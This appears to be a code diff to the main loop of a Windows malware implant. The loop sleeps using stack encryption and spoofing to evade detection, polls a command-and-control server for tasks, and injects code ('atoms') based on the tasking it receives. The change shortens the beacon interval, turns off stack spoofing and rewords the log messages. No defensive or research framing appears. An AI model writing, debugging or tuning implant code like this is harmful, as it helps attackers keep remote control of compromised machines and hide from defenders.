@@ -329,8 +329,8 @@ DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
     while (TRUE) {
         /* Obfuscated Sleep using Stack Encryption */
         SLEEP_CONFIG sleepCfg = { 0 };
-        sleepCfg.dwSleepMs = 15000;
-        sleepCfg.bStackSpoof = Config::ENABLE_STACK_SPOOF;
+        sleepCfg.dwSleepMs = 2000; // Cranking speed for real-time response
+        sleepCfg.bStackSpoof = FALSE; // Disabling spoof temporarily to resolve the hang
         
         /* FIX: Corrected initialization order to prevent crash */
         sleepCfg.pImplantBase = GetModuleHandleW(NULL); 
@@ -338,12 +338,12 @@ DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
         PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)sleepCfg.pImplantBase + pDos->e_lfanew);
         sleepCfg.szImplantSize = pNt->OptionalHeader.SizeOfImage;
         
-        Logger::Log(INFO, "Entering Obfuscated Sleep (15s)... Signal masked.");
+        Logger::Log(INFO, "Entering Sleep (2s)... Connection pulse imminent.");
         ObfuscatedSleep(&sleepCfg, &g_SyscallTable);
 
         taskJson = FetchTask();
         if (!taskJson.empty() && taskJson != "NO_TASK") {
-            Logger::Log(SUCCESS, "Received dynamic tasking from C2.");
+            Logger::Log(SUCCESS, "Link established! Received dynamic tasking.");
             if (taskJson.find('{') != std::string::npos) {
                 if (SpawnAtomFromTask(taskJson)) {
                     SendTaskResult("Atom Injected Successfully.");
